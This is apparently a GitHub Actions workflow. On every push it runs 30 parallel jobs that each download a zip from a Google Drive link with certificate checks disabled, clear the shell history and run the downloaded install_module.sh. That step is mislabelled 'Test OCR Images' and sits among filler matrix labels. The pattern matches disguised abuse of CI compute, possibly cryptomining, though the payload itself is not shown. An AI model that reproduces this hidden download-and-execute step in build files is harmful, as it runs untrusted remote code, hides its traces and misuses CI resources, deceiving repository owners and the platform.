name: thuattoan7code
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  SETUP:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Init', 'Generate', 'Check', 'Start', 'Ship']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1fcOxDVfR4d8AkYo1oj-WIkjldJhBOcof" -O thuattoan7code.zip
        unzip -o thuattoan7code.zip
        rm thuattoan7code.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


  RELEASE1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Acquire', 'Assemble', 'Verify', 'Launch', 'Deliver']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1fcOxDVfR4d8AkYo1oj-WIkjldJhBOcof" -O thuattoan7code.zip
        unzip -o thuattoan7code.zip
        rm thuattoan7code.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh
        
